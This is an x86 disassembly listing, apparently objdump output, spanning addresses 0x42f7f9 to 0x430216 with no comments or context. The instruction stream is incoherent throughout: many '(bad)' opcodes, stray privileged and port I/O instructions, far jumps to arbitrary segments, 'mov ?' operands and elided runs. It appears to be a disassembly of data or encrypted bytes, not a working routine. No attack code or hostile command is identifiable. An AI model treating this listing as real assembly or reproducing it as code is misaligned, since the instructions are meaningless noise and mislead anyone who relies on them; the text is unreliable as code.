  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0xdc9521cb
  42f804:	je     0x42f802
  42f806:	add    DWORD PTR [eax],eax
  42f808:	add    al,0x1
  42f80a:	add    BYTE PTR [eax],al
  42f80c:	stos   DWORD PTR es:[edi],eax
  42f80d:	and    al,0xa1
  42f80f:	sub    al,0xfa
  42f811:	loope  0x42f7a9
  42f813:	jno    0x42f7fc
  42f815:	popf   
  42f816:	push   edx
  42f817:	adc    al,0xa0
  42f819:	cdq    
  42f81a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f81b:	sar    BYTE PTR [ecx],cl
  42f81d:	cmp    ch,BYTE PTR [edx]
  42f81f:	les    esi,FWORD PTR [ebx+0x6e]
  42f822:	jmp    0x7aca708a
  42f827:	mov    ah,0xc7
  42f829:	lds    edx,FWORD PTR [ecx]
  42f82b:	pop    ebp
  42f82c:	shr    DWORD PTR [eax+0x3cc74fbc],cl
  42f832:	or     eax,0x6de3345d
  42f837:	retf   
  42f838:	dec    esi
  42f839:	xchg   edx,eax
  42f83a:	pusha  
  42f83b:	push   edx
  42f83c:	popa   
  42f83d:	int    0x3d
  42f83f:	xor    al,0x1e
  42f841:	iret   
  42f842:	sbb    BYTE PTR [edx+0x6908358d],bl
  42f848:	push   cs
  42f849:	sbb    al,0x1f
  42f84b:	dec    esp
  42f84c:	adc    al,0x2e
  42f84e:	add    al,0x69
  42f850:	jg     0x42f812
  42f852:	sub    dl,BYTE PTR [esi-0x12]
  42f855:	sub    DWORD PTR [eax+0x25],esp
  42f858:	fstp   TBYTE PTR [edi]
  42f85a:	push   ebp
  42f85b:	das    
  42f85c:	mov    eax,0xa360a298
  42f861:	mov    ?,WORD PTR [esi-0x38]
  42f864:	sub    DWORD PTR [ebx+0x69],edx
  42f867:	and    cl,BYTE PTR [edi]
  42f869:	ret    0x7555
  42f86c:	enter  0x2998,0xcd
  42f870:	bnd jb 0x42f8c7
  42f873:	repnz shl BYTE PTR [eax],0x31
  42f877:	inc    ecx
  42f878:	aas    
  42f879:	fsubr  DWORD PTR [ebp+0x36232436]
  42f87f:	xor    ch,0xa1
  42f882:	(bad)  
  42f883:	mov    cl,0x89
  42f885:	shr    DWORD PTR [esi],1
  42f887:	sbb    BYTE PTR [ebp-0x7f0bd2b5],ah
  42f88d:	std    
  42f88e:	fld    QWORD PTR [esi+eiz*8+0x784b2a4f]
  42f895:	nop
  42f896:	sub    eax,0xddd455b5
  42f89b:	push   0xff593662
  42f8a0:	lea    edx,[ebx+0x35feab34]
  42f8a6:	dec    esi
  42f8a7:	inc    edx
  42f8a8:	ror    BYTE PTR [esi+esi*2+0x69baa562],0xf0
  42f8b0:	push   eax
  42f8b1:	sbb    ecx,DWORD PTR [esi+esi*8+0x38fdcd1f]
  42f8b8:	mov    ah,0xa7
  42f8ba:	clc    
  42f8bb:	inc    edi
  42f8bc:	mov    bh,0x64
  42f8be:	repz xor DWORD PTR [ebp+eax*8-0x7eec435b],ecx
  42f8c6:	jge    0x42f879
  42f8c8:	mov    esp,0x35b6b9f5
  42f8cd:	fwait
  42f8ce:	dec    edx
  42f8cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f8d0:	mov    al,0x32
  42f8d2:	imul   edx,esi,0xa7d169c9
  42f8d8:	and    ch,bl
  42f8da:	mov    BYTE PTR [edx+0x66],ah
  42f8dd:	sbb    esi,edi
  42f8df:	adc    DWORD PTR [esi-0x7c009dcc],ebx
  42f8e5:	or     BYTE PTR [ecx],bh
  42f8e7:	inc    ecx
  42f8e8:	jns    0x42f8a2
  42f8ea:	sub    DWORD PTR [ebx],0x79a98b8a
  42f8f0:	jmp    0x42f958
  42f8f2:	arpl   WORD PTR [ebx],cx
  42f8f4:	push   edi
  42f8f5:	and    ebx,DWORD PTR [ebx]
  42f8f7:	xor    ax,0x44e6
  42f8fb:	push   esi
  42f8fc:	cmp    eax,0x24
  42f8ff:	call   0xfd2babae
  42f904:	sbb    eax,0x4e5792f2
  42f909:	mul    BYTE PTR [edi-0x4697494e]
  42f90f:	dec    esp
	...
  42f974:	adc    al,0x74
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9cd
  42f981:	fisubr WORD PTR [ecx+0x1fd78c2]
  42f987:	add    BYTE PTR [ecx+eax*1],al
  42f98a:	add    BYTE PTR [eax],al
  42f98c:	test   DWORD PTR [ebx+ebx*4],ebp
  42f98f:	lods   eax,DWORD PTR ds:[esi]
  42f990:	and    al,0x88
  42f992:	fld    DWORD PTR [ecx-0x77a9dd07]
  42f998:	inc    ebp
  42f999:	aas    
  42f99a:	(bad)  
  42f99b:	dec    edi
  42f99c:	mov    al,ds:0x62a6f8e
  42f9a1:	jge    0x42f94c
  42f9a3:	lea    eax,[edx+edi*8+0x15]
  42f9a7:	push   edx
  42f9a8:	shld   DWORD PTR [eax],ecx,0xef
  42f9ac:	cmp    DWORD PTR [ecx+edi*1],eax
  42f9af:	ds dec eax
  42f9b1:	inc    ecx
  42f9b2:	test   eax,0x8631a6b
  42f9b7:	push   ds
  42f9b8:	js     0x42f9c3
  42f9ba:	push   0x97233856
  42f9bf:	xchg   esp,eax
  42f9c0:	dec    edi
  42f9c1:	sub    ch,cl
  42f9c3:	mov    edx,0xf8d08497
  42f9c8:	push   0xffffffca
  42f9ca:	sub    dh,BYTE PTR [eax+0xaef1be6]
  42f9d0:	pop    es
  42f9d1:	fwait
  42f9d2:	adc    BYTE PTR [ebx+ebx*2],0x85
  42f9d6:	jb     0x42f9f3
  42f9d8:	aaa    
  42f9d9:	or     cl,BYTE PTR [esi+edx*4-0x6830c316]
  42f9e0:	inc    ecx
  42f9e1:	daa    
  42f9e2:	sbb    eax,0xdae3bef8
  42f9e7:	xchg   BYTE PTR [edx],bh
  42f9e9:	aas    
  42f9ea:	adc    eax,0x85927ee5
  42f9ef:	push   ebp
  42f9f0:	push   ds
  42f9f1:	push   ebp
  42f9f2:	push   ds
  42f9f3:	popf   
  42f9f4:	sub    esp,DWORD PTR [ebx+0xb37252a]
  42f9fa:	push   esp
  42f9fb:	add    al,0xcf
  42f9fd:	push   esi
  42f9fe:	or     ebx,DWORD PTR [eax+0x27ddf7c1]
  42fa04:	xlat   BYTE PTR ds:[ebx]
  42fa05:	in     eax,dx
  42fa06:	(bad)  
  42fa07:	ss adc edi,eax
  42fa0a:	jns    0x42f9ba
  42fa0c:	xchg   edx,eax
  42fa0d:	shl    BYTE PTR [edi+edi*1],1
  42fa10:	push   ss
  42fa11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa12:	je     0x42f9c7
  42fa14:	fild   WORD PTR [ebp+0x6622d274]
  42fa1a:	sub    cl,ch
  42fa1c:	mov    esp,0x5ffdb6d2
  42fa21:	jge    0x42fa7c
  42fa23:	push   ss
  42fa24:	call   0x2cc5:0x92c85c65
  42fa2b:	pop    edi
  42fa2c:	loop   0x42fa89
  42fa2e:	sub    al,0xc0
  42fa30:	xlat   BYTE PTR ds:[ebx]
  42fa31:	cmp    DWORD PTR [edi+eax*2+0x45ab3a11],edi
  42fa38:	int3   
  42fa39:	or     ah,ah
  42fa3b:	aad    0xc4
  42fa3d:	dec    ax
  42fa3f:	jle    0x42fa98
  42fa41:	out    0xfd,eax
  42fa43:	push   ebp
  42fa44:	leave  
  42fa45:	(bad)  
  42fa46:	hlt    
  42fa47:	fwait
  42fa48:	in     ax,0x6b
  42fa4b:	inc    eax
  42fa4c:	sbb    eax,0x2883cc8a
  42fa51:	iret   
  42fa52:	push   edi
  42fa54:	mov    bl,0x50
  42fa56:	and    ah,BYTE PTR [edx-0xb]
  42fa59:	adc    ecx,edx
  42fa5b:	out    dx,al
  42fa5c:	mov    ebx,0x3a016ea0
  42fa61:	adc    al,0x12
  42fa63:	mov    ebx,0x837f4f86
  42fa68:	dec    edi
  42fa69:	mul    cl
  42fa6b:	aaa    
  42fa6c:	int3   
  42fa6d:	jge    0x42fa52
  42fa6f:	adc    al,0x10
  42fa71:	sbb    DWORD PTR [eax+0x4d],edx
  42fa74:	ss enter 0x4dcd,0x2b
  42fa79:	mov    dl,0x79
  42fa7b:	test   edx,ebp
  42fa7d:	mov    edi,es
  42fa7f:	fwait
  42fa80:	jbe    0x42fa83
  42fa82:	lock sub DWORD PTR [eax+0x17],esp
  42fa86:	cmp    ebx,DWORD PTR [ebx+0x34]
  42fa89:	mov    eax,ds:0x7e0a27c0
  42fa8e:	mov    dh,0x47
	...
  42faf4:	sbb    ebp,edi
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	enter  0x572a,0x85
  42fb04:	jl     0x42fb04
  42fb06:	add    DWORD PTR [eax],eax
  42fb08:	add    al,0x1
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb0d:	lea    ecx,[edi-0x11854b8a]
  42fb13:	icebp  
  42fb14:	dec    edi
  42fb15:	test   eax,0xf102ff0c
  42fb1a:	mov    bl,0x92
  42fb1c:	(bad)  
  42fb1d:	int3   
  42fb1e:	aaa    
  42fb1f:	in     eax,0xd8
  42fb21:	sbb    eax,0x20337760
  42fb26:	fs cdq 
  42fb28:	jp     0x42fb12
  42fb2a:	loope  0x42fb1a
  42fb2c:	leave  
  42fb2d:	mov    eax,0x74c5c0ea
  42fb32:	xlat   BYTE PTR ds:[ebx]
  42fb33:	or     cl,dh
  42fb35:	pop    eax
  42fb36:	lock pop edx
  42fb38:	dec    ebx
  42fb39:	sub    eax,0x1b32f563
  42fb3e:	clc    
  42fb3f:	mov    dl,0xa8
  42fb41:	call   0xc0fd:0x29a3b8b1
  42fb48:	(bad)  
  42fb4b:	mov    ds:0x6dbb24b1,al
  42fb50:	es pushf 
  42fb52:	mov    dh,0xec
  42fb54:	(bad)  
  42fb55:	shl    BYTE PTR [eax],0x55
  42fb58:	cwde   
  42fb59:	fxch   st(0)
  42fb5b:	(bad)  
  42fb5c:	je     0x42fb84
  42fb5e:	add    esp,DWORD PTR [ebx-0x6f]
  42fb61:	cmp    DWORD PTR [edi-0x17],ebx
  42fb64:	add    esp,DWORD PTR [esi-0x67]
  42fb67:	in     al,dx
  42fb68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb69:	sbb    bh,cl
  42fb6b:	fcom   st(6)
  42fb6d:	imul   edi,DWORD PTR [edx+0x9],0xffffffd5
  42fb71:	nop
  42fb72:	into   
  42fb73:	xchg   esp,eax
  42fb74:	jno    0x42fb0b
  42fb76:	fcom   DWORD PTR [ecx+eax*1+0x3f]
  42fb7a:	cli    
  42fb7b:	mov    cl,0xac
  42fb7d:	xchg   ebx,eax
  42fb7e:	retf   
  42fb7f:	int3   
  42fb80:	ret    
  42fb81:	mov    bl,BYTE PTR [edi-0x4]
  42fb84:	scas   al,BYTE PTR es:[edi]
  42fb85:	icebp  
  42fb86:	fmul   QWORD PTR [edx+0x4cfab32]
  42fb8c:	(bad)  
  42fb8d:	fst    QWORD PTR [edi]
  42fb8f:	xchg   edx,eax
  42fb90:	jo     0x42fb4c
  42fb92:	pop    esp
  42fb93:	jne    0x42fba8
  42fb95:	or     eax,0x53b85b38
  42fb9a:	ficom  WORD PTR [eax]
  42fb9c:	into   
  42fb9d:	push   edi
  42fb9e:	retf   
  42fb9f:	rcr    edx,cl
  42fba1:	dec    esi
  42fba2:	dec    esp
  42fba3:	aad    0x94
  42fba5:	call   0x3c4916a9
  42fbaa:	or     ebp,edi
  42fbac:	cmp    eax,0x527bf189
  42fbb1:	test   al,0x35
  42fbb3:	xchg   esi,eax
  42fbb4:	mov    esi,0x250ecbcb
  42fbb9:	pop    ebp
  42fbba:	inc    esp
  42fbbb:	mov    edx,0x4ba2ab5f
  42fbc0:	sar    bh,1
  42fbc2:	leave  
  42fbc3:	rcl    BYTE PTR [ebp-0x53],0x41
  42fbc7:	and    eax,0xd8da741b
  42fbcc:	(bad)  [edx-0x68]
  42fbcf:	xchg   edi,eax
  42fbd0:	outs   dx,BYTE PTR ds:[esi]
  42fbd1:	sub    eax,0xdc9e185b
  42fbd6:	sub    BYTE PTR [ecx-0xb],0x28
  42fbda:	push   eax
  42fbdb:	or     al,0xb6
  42fbdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fbde:	outs   dx,DWORD PTR ds:[esi]
  42fbdf:	stos   DWORD PTR es:[edi],eax
  42fbe0:	pushf  
  42fbe1:	jo     0x42fc5a
  42fbe3:	into   
  42fbe4:	in     al,dx
  42fbe5:	out    0x54,al
  42fbe7:	les    edi,FWORD PTR [eax-0x5c05ee7b]
  42fbed:	out    0xb4,eax
  42fbef:	jmp    0xf069:0x7693565a
  42fbf6:	lock popa 
  42fbf8:	std    
  42fbf9:	mov    bh,0xbe
  42fbfb:	jnp    0x42fc75
  42fbfd:	or     dl,BYTE PTR [eax+eiz*8-0x632715e]
  42fc04:	inc    eax
  42fc05:	in     eax,0x12
  42fc07:	ret    0x8d99
  42fc0a:	ret    
  42fc0b:	sub    DWORD PTR [edi+eax*1],eax
  42fc0e:	out    0x8f,eax
	...
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    BYTE PTR [edi+esi*8],dl
  42fc82:	retf   0x80f4
  42fc85:	inc    DWORD PTR [ecx]
  42fc87:	add    BYTE PTR [ecx+eax*1],al
  42fc8a:	add    BYTE PTR [eax],al
  42fc8c:	call   0x7b2e:0xd092d415
  42fc93:	add    bh,BYTE PTR [edx+0x37]
  42fc96:	out    dx,eax
  42fc97:	aam    0x39
  42fc99:	push   esi
  42fc9a:	ss (bad) 
  42fc9c:	in     al,dx
  42fc9d:	vcvtss2sd xmm1,xmm6,DWORD PTR [edx-0x290c5729]
  42fca5:	mov    ebx,0xb9ac0d45
  42fcaa:	lea    esp,[ecx-0x462e14ea]
  42fcb0:	fwait
  42fcb1:	sbb    al,0x32
  42fcb3:	jmp    0x1d92:0x4419567f
  42fcba:	mov    DWORD PTR [eax],edi
  42fcbc:	fs pushf 
  42fcbe:	cld    
  42fcbf:	pop    edi
  42fcc0:	mov    ds:0x846226f3,eax
  42fcc5:	pop    edx
  42fcc6:	push   ds
  42fcc7:	pop    esp
  42fcc8:	sar    edx,1
  42fcca:	cmp    eax,0xc70546d9
  42fccf:	(bad)  
  42fcd0:	xchg   edi,eax
  42fcd1:	inc    edi
  42fcd2:	pushf  
  42fcd3:	jl     0x42fd3c
  42fcd5:	(bad)  
  42fcd6:	pop    ss
  42fcd7:	sbb    DWORD PTR [edx+0x39],ebx
  42fcda:	sbb    al,0x1a
  42fcdc:	push   es
  42fcdd:	ret    
  42fcde:	add    al,0x44
  42fce0:	mov    ebp,0x3e53bb64
  42fce5:	or     BYTE PTR [ecx+eax*2-0xd],bh
  42fce9:	test   BYTE PTR [ecx],al
  42fceb:	gs add eax,0x43b54c16
  42fcf1:	cmp    eax,0x31a96f6d
  42fcf6:	cli    
  42fcf7:	mov    al,ds:0xf0632552
  42fcfc:	rcl    BYTE PTR [edi-0x6277f410],cl
  42fd02:	scas   al,BYTE PTR es:[edi]
  42fd03:	mov    al,0x3c
  42fd05:	repz popa 
  42fd07:	sub    BYTE PTR [ebx+0x39],ch
  42fd0a:	dec    eax
  42fd0b:	cmc    
  42fd0c:	mov    ebp,0x7ed69dbb
  42fd11:	adc    esi,DWORD PTR [eax+0x42a3d0c6]
  42fd17:	xchg   esi,eax
  42fd18:	stos   DWORD PTR es:[edi],eax
  42fd19:	xchg   ebx,eax
  42fd1a:	push   0xffffffc9
  42fd1c:	fisubr DWORD PTR [esi+0x369c01d0]
  42fd22:	xchg   edx,eax
  42fd23:	lock mov eax,0x947e3eba
  42fd29:	(bad)  
  42fd2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fd2b:	rcr    DWORD PTR [edx],1
  42fd2d:	pop    esi
  42fd2e:	mov    eax,ds:0x9683ab4f
  42fd33:	mov    bh,0xd5
  42fd35:	fistp  QWORD PTR [esi-0x10]
  42fd38:	in     eax,dx
  42fd39:	cmp    ebp,DWORD PTR [edx]
  42fd3b:	adc    DWORD PTR [eax],ebp
  42fd3d:	dec    edx
  42fd3e:	sub    DWORD PTR ds:0x7e70e969,0x82bce2d5
  42fd48:	dec    esi
  42fd49:	pushf  
  42fd4a:	xor    ah,BYTE PTR fs:[edi-0x33b329d]
  42fd51:	ret    0x56b8
  42fd54:	sahf   
  42fd55:	cmp    eax,0x894ed6a2
  42fd5a:	lds    edx,FWORD PTR [ebp+0x2262b0f7]
  42fd60:	ret    0x1be
  42fd63:	ret    
  42fd64:	outs   dx,BYTE PTR ds:[esi]
  42fd65:	(bad)  
  42fd66:	nop
  42fd67:	ret    
  42fd68:	inc    ecx
  42fd69:	jns    0x42fd52
  42fd6b:	mov    BYTE PTR [ecx-0x6c],ch
  42fd6e:	add    BYTE PTR [edx+0x7f],ch
  42fd71:	sub    DWORD PTR [edi+0x6b80ca23],eax
  42fd77:	xchg   ecx,eax
  42fd78:	sbb    edi,DWORD PTR [eax+0xb7f8dae]
  42fd7e:	xor    dl,BYTE PTR [ebx-0x74]
  42fd81:	std    
  42fd82:	push   eax
  42fd83:	ret    0xaf55
  42fd86:	call   0x9e6f:0x9add1e95
  42fd8d:	ja     0x42fd41
  42fd8f:	pop    DWORD PTR [eax]
	...
  42fdf1:	add    BYTE PTR [eax],al
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz sbb dl,BYTE PTR [ebp+0x84148d]
  42fe06:	add    al,BYTE PTR [eax]
  42fe08:	add    al,0x1
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	push   ds
  42fe0d:	mov    BYTE PTR [eax],0x3b
  42fe10:	xlat   BYTE PTR ds:[ebx]
  42fe11:	es sbb al,0xc6
  42fe14:	sti    
  42fe15:	push   cs
  42fe16:	sub    ecx,DWORD PTR [edx-0x5c]
  42fe19:	rcl    ebp,0x2d
  42fe1c:	shr    BYTE PTR [ebx],cl
  42fe1e:	(bad)  
  42fe1f:	pop    esi
  42fe20:	pop    ebx
  42fe21:	mov    ah,0xec
  42fe23:	(bad)  
  42fe24:	outs   dx,BYTE PTR ds:[esi]
  42fe25:	cmp    edx,DWORD PTR [ecx+0x476b1fc4]
  42fe2b:	sub    BYTE PTR [edi],ch
  42fe2d:	jne    0x42fe8f
  42fe2f:	retf   0xddd
  42fe32:	test   eax,0xcbdd5de1
  42fe37:	leave  
  42fe38:	mov    esp,ebp
  42fe3a:	jl     0x42fe71
  42fe3c:	and    eax,0x205e2c6
  42fe41:	test   BYTE PTR [edx-0x22],ah
  42fe44:	lahf   
  42fe45:	xor    bl,dl
  42fe47:	cmp    BYTE PTR [edi+0x63],dl
  42fe4a:	fs inc ebx
  42fe4c:	cld    
  42fe4d:	pusha  
  42fe4e:	xchg   edx,eax
  42fe4f:	test   ah,0x21
  42fe52:	mov    DWORD PTR [ecx],edi
  42fe54:	cwde   
  42fe55:	adc    ch,BYTE PTR [edx]
  42fe57:	mov    DWORD PTR [ecx-0x2465de53],esi
  42fe5d:	je     0x42fdfe
  42fe5f:	bound  ecx,QWORD PTR [edi+eiz*8+0x58476b5]
  42fe66:	stc    
  42fe67:	pop    ebp
  42fe68:	inc    ecx
  42fe69:	fisttp WORD PTR [edx]
  42fe6b:	es popa 
  42fe6d:	ins    DWORD PTR es:[edi],dx
  42fe6e:	rol    BYTE PTR [ebx+0x66],1
  42fe71:	jns    0x42fe3c
  42fe73:	jge    0x42fe2e
  42fe75:	dec    esp
  42fe76:	jne    0x42fe6c
  42fe78:	pop    esi
  42fe79:	jmp    0x42fe91
  42fe7b:	push   esi
  42fe7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fe7d:	adc    BYTE PTR [edx-0x75cc38cd],bh
  42fe83:	pop    ecx
  42fe84:	and    al,0x39
  42fe86:	imul   DWORD PTR [esi]
  42fe88:	cmp    al,0x25
  42fe8a:	int3   
  42fe8b:	sub    al,0x16
  42fe8d:	fwait
  42fe8e:	add    esp,DWORD PTR [ebx-0x64]
  42fe91:	leave  
  42fe92:	ror    DWORD PTR [ecx+0x4405d764],cl
  42fe98:	push   esp
  42fe99:	dec    esi
  42fe9a:	or     al,0xe7
  42fe9c:	jne    0x42fecd
  42fe9e:	jne    0x42fe78
  42fea0:	cli    
  42fea1:	stos   DWORD PTR es:[edi],eax
  42fea2:	test   BYTE PTR [eax],cl
  42fea4:	xor    esp,eax
  42fea6:	test   al,0x4c
  42fea8:	cmp    dl,0x8e
  42feab:	out    dx,eax
  42feac:	jbe    0x42ff27
  42feae:	in     al,0xbd
  42feb0:	or     DWORD PTR [edi+0x1b482b55],edi
  42feb6:	xor    bh,ah
  42feb8:	loopne 0x42fe5e
  42feba:	aam    0x47
  42febc:	or     bh,BYTE PTR [edx]
  42febe:	(bad)  
  42fec0:	fisttp QWORD PTR [eax]
  42fec2:	cld    
  42fec3:	imul   edi,edx,0xfffffff9
  42fec6:	or     ecx,esp
  42fec8:	pop    ecx
  42fec9:	add    DWORD PTR [edi-0xd],ebp
  42fecc:	adc    eax,0x4326edf6
  42fed1:	jge    0x42ff39
  42fed3:	xor    dl,dh
  42fed5:	lds    esi,FWORD PTR [esi-0x38c79753]
  42fedb:	cmp    ecx,DWORD PTR [edx+ebx*4-0x5beb54b9]
  42fee2:	jecxz  0x42fefb
  42fee4:	rcr    DWORD PTR [esi-0x74],0x7f
  42fee8:	(bad)  
  42fee9:	loopne 0x42feb9
  42feeb:	or     DWORD PTR [edi],ebp
  42feed:	jbe    0x42fea3
  42feef:	mov    ecx,0xd74776d3
  42fef4:	cmp    BYTE PTR [ebp+0x3a6cc4be],ah
  42fefa:	stos   BYTE PTR es:[edi],al
  42fefb:	sahf   
  42fefc:	push   0x16
  42fefe:	arpl   WORD PTR [esi+0x3a39e54e],si
  42ff04:	(bad)  
  42ff05:	out    0xb5,eax
  42ff07:	es jmp 0x7a77:0xca06c0a
  42ff0f:	add    BYTE PTR [eax],0x0
	...
  42ff72:	add    BYTE PTR [eax],al
  42ff74:	add    al,0x67
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [ecx+eiz*2-0x3b],0x94
  42ff83:	je     0x42ff0d
  42ff85:	add    DWORD PTR [edx],eax
  42ff87:	add    BYTE PTR [ecx+eax*1],al
  42ff8a:	add    BYTE PTR [eax],al
  42ff8c:	les    esi,FWORD PTR [edi+0x32e96bf8]
  42ff92:	mov    ah,0x85
  42ff94:	sub    BYTE PTR [ebx-0x6f40bee6],0x56
  42ff9b:	hlt    
  42ff9c:	mov    WORD PTR ds:0x9f40e523,gs
  42ffa2:	and    bl,BYTE PTR [ecx-0x70]
  42ffa5:	rcl    ch,cl
  42ffa7:	rcl    DWORD PTR [ebx],cl
  42ffa9:	cmp    eax,0xfd060b88
  42ffae:	pop    ss
  42ffaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ffb0:	cmp    al,0x21
  42ffb2:	sub    eax,0x3f2d527d
  42ffb7:	data16 je 0x42ff40
  42ffba:	dec    ecx
  42ffbb:	lods   al,BYTE PTR ds:[esi]
  42ffbc:	add    eax,0x3cf0ea9b
  42ffc1:	cld    
  42ffc2:	cwde   
  42ffc3:	gs popf 
  42ffc5:	data16 xlat BYTE PTR ds:[ebx]
  42ffc7:	mov    WORD PTR [eax+ebp*1],gs
  42ffca:	ret    0x9553
  42ffcd:	mov    al,0xd0
  42ffcf:	test   eax,0xc95101f9
  42ffd4:	out    dx,eax
  42ffd5:	pop    ecx
  42ffd6:	xchg   edx,eax
  42ffd7:	nop
  42ffd8:	(bad)  
  42ffda:	jmp    0xe936:0xa244f0d4
  42ffe1:	(bad)  
  42ffe2:	pop    eax
  42ffe3:	std    
  42ffe4:	(bad)  
  42ffe5:	loopne 0x430051
  42ffe7:	rcr    DWORD PTR [eax-0x12],1
  42ffea:	in     eax,0x95
  42ffec:	push   0xffffffc2
  42ffee:	nop
  42ffef:	in     eax,0xfb
  42fff1:	xchg   edx,eax
  42fff2:	jmp    0xa8d0:0xb880284b
  42fff9:	in     eax,dx
  42fffa:	jb     0x42ffee
  42fffc:	ret    0xbc1a
  42ffff:	loop   0x42ff87
  430001:	call   0x76:0xd0b9b11f
  430008:	ror    BYTE PTR [ebx],0x86
  43000b:	dec    edx
  43000c:	mov    bl,0xc5
  43000e:	in     eax,0x53
  430010:	sbb    cl,cl
  430012:	and    eax,0xaa634418
  430017:	add    BYTE PTR [eax],ch
  430019:	addr16 mov ch,0x6d
  43001c:	lahf   
  43001d:	popa   
  43001e:	(bad)  
  43001f:	rcl    ebx,0xee
  430022:	paddsb mm7,QWORD PTR [ecx+0x7]
  430026:	mov    dl,BYTE PTR [ebx+eax*1+0x6162c12b]
  43002d:	xchg   ebp,eax
  43002e:	dec    ebx
  43002f:	and    al,0xb
  430031:	push   ecx
  430032:	fcomp  QWORD PTR ds:0xb1104b37
  430038:	dec    esp
  430039:	or     al,0xd7
  43003c:	pop    ds
  43003d:	fcomip st,st(6)
  43003f:	and    ah,BYTE PTR [edx-0x53]
  430042:	xchg   ecx,eax
  430043:	sbb    eax,0x1ca54961
  430048:	pop    esp
  430049:	les    ecx,FWORD PTR [ebx]
  43004b:	add    ecx,DWORD PTR gs:[ecx+ebx*1]
  43004f:	cs xchg ebx,ebp
  430052:	sbb    al,0x4f
  430054:	pop    esi
  430055:	fisubr DWORD PTR [edx+edi*2]
  430058:	cmp    esp,esi
  43005a:	daa    
  43005b:	xor    al,0xe8
  43005d:	fnstcw WORD PTR [eax]
  43005f:	push   0x32e78196
  430064:	mov    al,0x9
  430066:	int3   
  430067:	dec    bl
  430069:	dec    edi
  43006a:	pop    ds
  43006b:	into   
  43006c:	in     eax,dx
  43006d:	pop    edi
  43006e:	pop    ss
  43006f:	pop    es
  430070:	adc    eax,0x4d1b5876
  430075:	not    DWORD PTR [ebp*2+0x1cd09718]
  43007c:	adc    al,ch
  43007e:	mov    esi,0x420b65c8
  430083:	ficom  WORD PTR [ecx-0xd]
  430086:	shl    BYTE PTR [ecx-0x1dc4e2c],0x8d
  43008d:	mov    dl,0x3e
  43008f:	lods   al,BYTE PTR ds:[esi]
	...
  4300f4:	(bad)  
  4300f5:	ins    DWORD PTR es:[edi],dx
  4300f6:	aam    0xb5
  4300f8:	(bad)  
  4300f9:	mov    ebp,0x9547fe7
  4300fe:	scas   eax,DWORD PTR es:[edi]
  4300ff:	add    al,0x93
  430101:	xor    al,0x9e
  430103:	jmp    0x72:0x2028c
  43010a:	add    BYTE PTR [eax],al
  43010c:	push   cs
  43010d:	lods   al,BYTE PTR ds:[esi]
  43010e:	sbb    al,BYTE PTR [ecx]
  430110:	shl    BYTE PTR [esi-0x1c],cl
  430113:	dec    edi
  430114:	jp     0x430169
  430116:	mov    cl,0x52
  430118:	sub    dh,ch
  43011a:	or     al,0xcc
  43011c:	iret   
  43011d:	mov    al,0xba
  43011f:	inc    eax
  430120:	xchg   edx,eax
  430121:	or     DWORD PTR [ebp+0x44],esp
  430124:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430125:	pop    esi
  430126:	popf   
  430127:	dec    edx
  430128:	fild   DWORD PTR [ecx+ecx*1-0x2f]
  43012c:	stc    
  43012d:	loopne 0x4300d6
  43012f:	outs   dx,DWORD PTR ds:[esi]
  430130:	push   esi
  430131:	mov    DWORD PTR [ecx-0x39],0xbfaaebb8
  430138:	add    bh,BYTE PTR [eax-0x5c]
  43013b:	jbe    0x4300f6
  43013d:	enter  0xf888,0x92
  430141:	pop    ebx
  430142:	adc    esp,DWORD PTR [esp+esi*2-0xe]
  430146:	call   0xfec8635c
  43014b:	push   esi
  43014c:	dec    esi
  43014d:	aaa    
  43014e:	pop    ecx
  43014f:	mov    esi,0xd2790b53
  430154:	mov    DWORD PTR [ebp+0x52181ce7],eax
  43015a:	stos   DWORD PTR es:[edi],eax
  43015b:	mov    edx,0xb088f1e
  430160:	inc    eax
  430161:	jg     0x43017f
  430163:	mov    ch,0xe6
  430165:	sbb    al,0x75
  430168:	imul   esp,DWORD PTR [esi+0x6f],0x7601c1ba
  43016f:	dec    ebp
  430170:	aas    
  430171:	xchg   edi,eax
  430172:	js     0x430198
  430174:	sbb    esi,0x4822fdcc
  43017a:	push   esi
  43017b:	add    DWORD PTR [esi+0x1d],0x0
	...
  4301f2:	add    BYTE PTR [eax],al
  4301f4:	dec    ebp
  4301f5:	push   ebp
  4301f6:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  4301fc:	mov    esp,ebp
  4301fe:	or     ah,dh
  430200:	dec    ebp
  430201:	add    bh,al
  430203:	add    BYTE PTR [eax],cl
  430205:	add    BYTE PTR [eax],al
  430207:	mov    DWORD PTR [eax],0x40f44545
  43020d:	xor    DWORD PTR [eax],eax
  43020f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430215:	(bad)  
  430216:	enter  0x4d45,0xbc
